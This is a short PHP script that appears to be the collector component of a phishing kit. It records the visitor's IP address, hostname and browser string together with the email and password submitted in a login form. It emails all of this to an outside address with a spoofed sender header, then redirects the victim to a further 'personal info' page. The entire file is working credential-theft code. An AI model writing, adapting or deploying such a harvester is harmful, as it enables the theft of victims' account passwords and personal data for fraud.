<?php
$ip = getenv("REMOTE_ADDR");
$bilmsg .= "-------------- ######################## ----------\n";
$bilmsg .= "IP              : $ip\n";
$bilmsg .= "HOST            : ".gethostbyaddr($ip)."\n";
$bilmsg .= "browser         : ".$_SERVER['HTTP_USER_AGENT']."\n";
$bilmsg .= "-------------- ########################  ----------\n";
$bilmsg .= "Email         : ".$_POST['email']."\n";
$bilmsg .= "Mot           : ".$_POST['pass']."\n";
$bilmsg .= "-------------- ########################  ----------\n";
$bilsnd = "zero.plan@gmx.fr";
$bilsub = "'login'$ip";
$bilhead = "From: 01 ppl  FR '<wer@info.fr>";
$bilhead .= $_POST['eMailAdd']."\n";
$bilhead .= "MIME-Version: 1.0\n";
mail($bilsnd,$bilsub,$bilmsg,$bilhead);

header("Location:infopersonnal.html?id=454587545&mail&from&smartphone?454584515155184s5454a548sa54a514s515num?454515577774548454client");
?>